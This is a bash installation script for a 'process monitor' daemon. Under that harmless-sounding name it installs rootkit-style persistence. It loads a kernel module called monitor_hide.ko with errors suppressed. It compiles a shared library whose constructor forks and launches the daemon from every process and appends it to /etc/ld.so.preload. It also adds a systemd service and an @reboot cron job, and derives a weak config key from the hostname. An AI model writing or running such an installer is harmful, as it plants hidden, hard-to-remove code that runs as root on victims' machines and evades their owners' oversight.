#!/bin/bash
# Process Monitor Installation Script

set -e

INSTALL_DIR="/usr/local/bin"
CONFIG_DIR="/etc/process-monitor"
LOG_DIR="/var/log/process-monitor"
SERVICE_NAME="process-monitor"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "Process Monitor Installation Script"
echo "=================================="

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This script must be run as root${NC}"
    exit 1
fi

# Detect architecture
ARCH=$(uname -m)
case $ARCH in
    x86_64)
        BINARY_NAME="process-monitor-daemon-linux-amd64"
        ;;
    aarch64)
        BINARY_NAME="process-monitor-daemon-linux-arm64"
        ;;
    *)
        echo -e "${RED}Error: Unsupported architecture: $ARCH${NC}"
        exit 1
        ;;
esac

# Find binary
BINARY_PATH=""
if [ -f "./build/process-monitor-daemon" ]; then
    BINARY_PATH="./build/process-monitor-daemon"
elif [ -f "./process-monitor-daemon" ]; then
    BINARY_PATH="./process-monitor-daemon"
else
    echo -e "${RED}Error: Binary not found. Please run 'make build' first${NC}"
    exit 1
fi

echo -e "${GREEN}✓${NC} Found binary: $BINARY_PATH"

# Create directories
echo "Creating directories..."
mkdir -p "$INSTALL_DIR"
mkdir -p "$CONFIG_DIR"
mkdir -p "$LOG_DIR"
mkdir -p "/var/backups/process-monitor"

# Install binary
echo "Installing binary..."
cp "$BINARY_PATH" "$INSTALL_DIR/process-monitor-daemon"
chmod +x "$INSTALL_DIR/process-monitor-daemon"
echo -e "${GREEN}✓${NC} Binary installed to $INSTALL_DIR"

# Generate configuration
echo "Generating configuration..."
MASTER_KEY=$(hostname | md5sum | cut -d' ' -f1)
export MASTER_KEY

# Create default config if not exists
if [ ! -f "$CONFIG_DIR/config.yaml.enc" ]; then
    $INSTALL_DIR/process-monitor-daemon -config "$CONFIG_DIR/config.yaml.enc" -install
    echo -e "${GREEN}✓${NC} Configuration created at $CONFIG_DIR/config.yaml.enc"
else
    echo -e "${YELLOW}!${NC} Configuration already exists, skipping"
fi

# Build and install kernel module
echo "Building kernel module..."
if [ -d "./kernel" ]; then
    cd kernel
    if make clean && make; then
        echo "Installing kernel module..."
        insmod monitor_hide.ko 2>/dev/null || modprobe monitor_hide 2>/dev/null || true
        echo -e "${GREEN}✓${NC} Kernel module installed"
        cd ..
    else
        echo -e "${YELLOW}!${NC} Kernel module build failed, continuing without it"
        cd ..
    fi
else
    echo -e "${YELLOW}!${NC} Kernel module source not found, skipping"
fi

# Install systemd service
echo "Installing systemd service..."
cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=Process Monitor Daemon
After=network.target

[Service]
Type=simple
User=root
ExecStart=$INSTALL_DIR/process-monitor-daemon -daemon -config $CONFIG_DIR/config.yaml.enc
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
echo -e "${GREEN}✓${NC} Systemd service installed"

# Setup ld.so.preload
echo "Setting up ld.so.preload persistence..."
LIB_PATH="/usr/local/lib/libprocess_monitor.so"

if [ ! -f "$LIB_PATH" ]; then
    # Compile library
    cat > /tmp/libprocess_monitor.c << 'EOFLIB'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <signal.h>

static int initialized = 0;

__attribute__((constructor)) static void init(void) {
    if (initialized) return;
    initialized = 1;

    FILE *fp = fopen("/var/run/process-monitor.pid", "r");
    if (fp) {
        int pid;
        fscanf(fp, "%d", &pid);
        fclose(fp);
        if (pid > 0 && kill(pid, 0) == 0) return;
    }

    pid_t p = fork();
    if (p == 0) {
        setsid();
        chdir("/");
        close(0); close(1); close(2);
        execl("/usr/local/bin/process-monitor-daemon",
              "process-monitor-daemon",
              "-daemon",
              "-config", "/etc/process-monitor/config.yaml.enc",
              NULL);
        exit(1);
    } else if (p > 0) {
        fp = fopen("/var/run/process-monitor.pid", "w");
        if (fp) {
            fprintf(fp, "%d", p);
            fclose(fp);
        }
    }
}
EOFLIB

    gcc -shared -fPIC -o "$LIB_PATH" /tmp/libprocess_monitor.c 2>/dev/null || true
    rm -f /tmp/libprocess_monitor.c
fi

if [ -f "$LIB_PATH" ]; then
    echo "$LIB_PATH" >> /etc/ld.so.preload
    echo -e "${GREEN}✓${NC} ld.so.preload configured"
else
    echo -e "${YELLOW}!${NC} Failed to create preload library"
fi

# Setup cron
echo "Setting up cron persistence..."
(crontab -l 2>/dev/null; echo "@reboot sleep 30 && $INSTALL_DIR/process-monitor-daemon -daemon -config $CONFIG_DIR/config.yaml.enc") | crontab -
echo -e "${GREEN}✓${NC} Cron job configured"

# Set permissions
chown root:root "$INSTALL_DIR/process-monitor-daemon"
chmod 755 "$INSTALL_DIR/process-monitor-daemon"
chmod 600 "$CONFIG_DIR/config.yaml.enc" 2>/dev/null || true
chmod 750 "$LOG_DIR"

echo ""
echo -e "${GREEN}Installation complete!${NC}"
echo ""
echo "Available commands:"
echo "  systemctl start $SERVICE_NAME    - Start the daemon"
echo "  systemctl stop $SERVICE_NAME     - Stop the daemon"
echo "  systemctl enable $SERVICE_NAME   - Enable on boot"
echo "  systemctl status $SERVICE_NAME   - Check status"
echo "  journalctl -u $SERVICE_NAME      - View logs"
echo ""
echo "To start the daemon now:"
echo "  systemctl start $SERVICE_NAME"
